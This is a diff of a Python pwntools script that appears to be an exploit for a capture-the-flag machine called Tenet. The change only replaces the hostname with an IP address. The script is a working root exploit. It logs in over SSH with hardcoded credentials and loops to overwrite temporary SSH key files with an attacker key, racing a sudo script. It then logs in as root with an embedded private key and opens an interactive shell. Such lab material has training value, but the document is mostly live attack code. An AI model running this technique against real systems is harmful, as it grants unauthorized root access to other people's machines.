@@ -16,17 +16,17 @@ rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
 os.system('echo "%s" > key' % (rsa))
 
 def exploit():
-    conn = ssh(host='Tenet', user='neil', password='Opera2112')
+    conn = ssh(host='10.10.10.223', user='neil', password='Opera2112')
     neil = conn.process("/bin/sh")
     neil.sendline(b'while true; do for rsa in /tmp/ssh-*; do echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys" > $rsa; done; done')
 
 threading.Thread(target=exploit, args=()).start()
 time.sleep(6)
-nect = ssh(host='Tenet', user='neil', password='Opera2112')
+nect = ssh(host='10.10.10.223', user='neil', password='Opera2112')
 privesc = nect.process("/bin/sh")
 privesc.sendline(b"sudo enableSSH.sh; sudo enableSSH.sh; sudo enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh")
 
 time.sleep(3)
-request = ssh(host='Tenet', user='root', keyfile='key')
+request = ssh(host='10.10.10.223', user='root', keyfile='key')
 shell = request.process("/bin/sh")
 shell.interactive()
